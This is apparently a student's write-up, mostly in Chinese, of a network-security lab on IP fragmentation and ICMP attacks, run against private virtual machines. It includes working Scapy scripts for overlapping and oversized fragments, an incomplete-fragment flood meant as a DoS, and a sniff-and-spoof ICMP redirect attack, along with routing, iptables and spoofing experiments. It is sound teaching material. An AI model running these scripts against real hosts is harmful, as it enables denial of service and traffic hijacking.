# IP/ICMP Attacks Lab

## Tasks 1: IP Fragmentation

### Task 1.a: Conducting IP Fragmentation

UDP server (`192.168.2.178`)

UDP client (`192.168.2.186`)

将96bytes的UDP data分包3次发送，在Scapy封装包时，需注意

* `udp.len`字段为整个udp报文的长度（len(data) + 8）

* DF始终置0，MF在最后一片报文前均置1
* Fragment_Offset单位为`8b`

```python
from scapy.all import *

ip = IP(src='192.168.2.186', dst='192.168.2.178')
ip.id = 1000
ip.proto = 17 # UDP
udp = UDP(sport=7777, dport=7777)
data = 'a' * 0x18 
data += "stdout donot like python" 
data += "a" * 0x18

udp.len = 8 + len(data)

try:
    # fragment 1
    ip.frag, ip.flags = 0, 1 # MF=1
    pkt = ip/udp/data[:0x18]
    pkt[UDP].chksum = 0
    send(pkt)

    # fragment 2
    ip.frag, ip.flags = (0x18+8) // 8, 1
    pkt = ip/data[0x18:-0x18]
    send(pkt)

    # fragment 3
    ip.frag, ip.flags = (0x18*2+8) // 8, 0
    pkt = ip/data[-0x18:]
    send(pkt)
    print("send successfully")
except:
    print("send error")
```

发送数据

![image-20201020102344749](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020102344749.png)

整合流量包

![image-20201020102454447](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020102454447.png)





### Task 1.b: IP Fragments with Overlapping Contents

- 第一片的后K字节数据应与第二片中的前K字节数据具有相同的偏移量（offset），自行决定合理K值，并在实验中指出

	```python
	24 [-]     pkt = ip/udp/data[:0x18]
	24 [+]     pkt = ip/udp/data[:0x28]
	```

	即k=0x10，发包

	![image-20201020102747329](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020102747329.png)

	![image-20201020102856502](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020102856502.png)

	`wireshark`捕获到了流量，但是`nc`并没有回显，说明接收到的流量不符合协议，于是nc不接受

- 令指定的偏移使得第二片完全包含于第一片中（不能相等）

	```python
	24 [-]    pkt = ip/udp/data[:0x28]
	24 [+]    pkt = ip/udp/data[:-0x18]
	```

	![image-20201020103159169](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020103159169.png)

	![image-20201020103217636](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020103217636.png)

	`nc`出现了回显，重组之后的包的数据为正常数据，说明协议正常

- 更换第一个和第二个的发送顺序

	```python
	from scapy.all import *
	
	ip = IP(src='192.168.2.186', dst='192.168.2.178')
	ip.id = 9999
	ip.proto = 17 # UDP
	udp = UDP(sport=7777, dport=7777)
	data = 'a' * 0x18 
	data += "stdout donot like python" 
	data += "a" * 0x18
	
	udp.len = 8 + len(data)
	
	
	try:
	
	    # fragment 2
	    ip.frag, ip.flags = (0x18+8) // 8, 1
	    pkt = ip/data[0x18:-0x18]
	    send(pkt)
	
	    # fragment 1
	    ip.frag, ip.flags = 0, 1 # MF=1
	    pkt = ip/udp/data[:0x18]
	    pkt[UDP].chksum = 0
	    send(pkt)
	
	    # fragment 3
	    ip.frag, ip.flags = (0x18*2+8) // 8, 0
	    pkt = ip/data[-0x18:]
	    send(pkt)
	    print("send successfully")
	
	except:
	    print("send error")
	
	```
```
	
	![image-20201020104048823](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020104048823.png)
	
	可以看到和第一个实验没有明显区别（区别就是在`wireshark`抓包的顺序



### Task 1.c: Sending a Super-Large Packet!

IP正常包最大长度为2^16(65535)，请尝试利用IP Frgments创建超过此限制的IP数据包，并观察实验结果

​```python
from scapy.all import *

ip = IP(src="192.168.2.186", dst="192.168.2.178")
ip.id = 9999
ip.proto = 17 # udp
udp = UDP(sport=7777, dport=7777)

# 65535 - 20(mac) = 65515
data = 'a' + 'b' * 65515 + 'a'
udp.len = len(data) + 8

ip.frag = 0
ip.flags = 1
# 65500 ==> 65504
pkt = ip/udp/data[:65504]
pkt[UDP].chksum = 0
send(pkt)

ip.frag = (65504+8) // 8
ip.flags = 0
pkt = ip/udp/data[65504:]
send(pkt)
```

终端上的报错，是由于试图直接发送一个超过65535长度的包，所以对其分片

![image-20201020110027989](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020110027989.png)

可以看到收到了很多的包，nc没有回显，说明不满足协议



### Task 1.d: Sending Incomplete IP Packet

在该任务中，将使用MachineA对MachineB发起DoS攻击

在攻击中，MachineA向B发送大量不完整的IP数据包（即这些数据包由IP分片组成，但缺少部分片段），所有这些不完整的IP数据包将停留在内核中，直到它们超时（这可能会导致内核占用大量内存），曾经这种攻击成功实现了对服务器的DoS攻击，请实验并描述实验结果

```python
from scapy.all import *

ip = IP(src="192.168.2.186", dst="192.168.2.178")
ip.proto = 17 # udp

udp = UDP(sport=7777, dport=7777)
data = "DDOS" * 0x100
udp.len = len(data) + 8

for i in range(0x1000):
    print("now send NO.{} packet".format(i))
    ip.id = i
    ip.frag = 0
    ip.flags = 1
    pkt = ip/udp/data[:0x10]
    pkt[UDP].chksum = 0
    send(pkt, verbose=0)

```

发包，查看进程和流量包

![image-20201020111019393](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020111019393.png)

接收到流量包之后过了一段时间，返回了icmp超时包

![image-20201020111052412](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020111052412.png)

在发包期间，`ping baidu.com`不通，可能是由于网络堵塞

![image-20201020111122876](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020111122876.png)





## Task 2: ICMP Redirect Attack

```python
from scapy.all import *

def redirect(pkt):
    # src need to be net host
    ip = IP(src="192.168.2.1", dst="192.168.2.178")
    icmp = ICMP(type=5, code=1)
    icmp.gw = '192.168.2.186'
    pkt = ip/icmp/bytes(pkt[IP])[:28]
    send(pkt, verbose=0)
    print("send once")

redirect = sniff(filter='ip src host 192.168.2.178', prn=redirect)
```

查看结果和流量包，发现被重定向

`1.1.1.10 -> 192.168.2.186`

![image-20201020113022598](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020113022598.png)



### Questions. 

- 使用ICMP重定向攻击尝试重定向到远程主机（即分配给icmp.gw的主机地址不在本地局域网下），请实验说明是否可行

	尝试把gw设置为自己的服务器：`47.115.154.103`

	![image-20201020113643833](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020113643833.png)

	没有发生变化

- 使用ICMP重定向攻击尝试重定向到本地局域网下不存活的主机地址，请实验说明是否可行

	![image-20201020113753676](https://gitee.com/ethustdout/pics/raw/master/img/image-20201020113753676.png)

	也没有发生变化



## Task 3: Routing and Reverse Path Filtering



### Task 3.a: Network Setup



#### vm R(seedUbuntu)

```shell
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:7a:5d:47 brd ff:ff:ff:ff:ff:ff
    inet 192.168.52.131/24 brd 192.168.52.255 scope global dynamic ens33
       valid_lft 1347sec preferred_lft 1347sec
    inet6 fe80::9688:b76f:c987:76b1/64 scope link 
       valid_lft forever preferred_lft forever
3: ens38: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:7a:5d:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.72.131/24 brd 192.168.72.255 scope global dynamic ens38
       valid_lft 1798sec preferred_lft 1798sec
    inet6 fe80::59a:db57:5c6d:49d6/64 scope link 
       valid_lft forever preferred_lft forever
```



#### vm A(ubuntu)

```shell
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:5e:18:b0 brd ff:ff:ff:ff:ff:ff
    inet 192.168.52.132/24 brd 192.168.52.255 scope global dynamic noprefixroute ens33
       valid_lft 1722sec preferred_lft 1722sec
    inet6 fe80::b407:283e:8d99:df25/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```



#### vm B(kali)

```shell
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:66:7c:40 brd ff:ff:ff:ff:ff:ff
    inet 192.168.72.130/24 brd 192.168.72.255 scope global dynamic noprefixroute eth0
       valid_lft 1794sec preferred_lft 1794sec
    inet6 fe80::20c:29ff:fe66:7c40/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```



### Task 3.b: Routing Setup

在`kali`和`ubuntu`上添加路由

`kali`:

```shell
kali@kali:~$ sudo ip route add 192.168.52.0/24 dev eth0 via 192.168.72.131
[sudo] password for kali: 
kali@kali:~$ ip route
default via 192.168.72.2 dev eth0 proto dhcp metric 100 
192.168.52.0/24 via 192.168.72.131 dev eth0 
192.168.72.0/24 dev eth0 proto kernel scope link src 192.168.72.130 metric 100 
```

`Ubuntu`:

```shell
shiroha@shiroha:~$ sudo ip route add 192.168.72.0/24 dev ens33 via 192.168.52.131
shiroha@shiroha:~$ ip route
169.254.0.0/16 dev ens33 scope link metric 1000 
192.168.52.0/24 dev ens33 proto kernel scope link src 192.168.52.132 metric 100 
192.168.72.0/24 via 192.168.52.131 dev ens33 
```

在`seedubuntu`上打开ip转发

```shell
[10/22/20]seed@VM:~$ sudo sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1
[10/22/20]seed@VM:~$ sudo su
root@VM:/home/seed# sysctl -w net.ipv6.conf.all.forwarding=1
net.ipv6.conf.all.forwarding = 1
```

配置转发规则

```shell
root@VM:/home/seed# iptables -A FORWARD -i ens38 -d 192.168.52.132

root@VM:/home/seed# iptables -A FORWARD -i ens33 -s 192.168.52.132 -j ACCEPT
```



尝试使用`kali ping ubuntu`和`telnet`连接

![image-20201022142429827](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022142429827.png)



### Task 3.c: Reverse Path Filtering

配置`iptables`，使用`netwox`工具伪造流量包

```shell
root@VM:/home/seed# iptables -A FORWARD -i ens38 -s 192.168.72.132 -j ACCEPT
root@VM:/home/seed# iptables -A FORWARD -i ens33 -d 192.168.72.132 -j ACCEPT

```

- 伪造ip为`192.168.72.253`

![image-20201022151345437](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022151345437.png)



- 伪造ip为`192.168.52.131`

![image-20201022151157345](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022151157345.png)

- 伪造ip为`1.1.1.9`

![image-20201022151512072](https://gitee.com/ethustdout/pics/raw/master/img/image-20201022151512072.png)



伪造ip和受害机在同一个网段下时，不会被丢弃包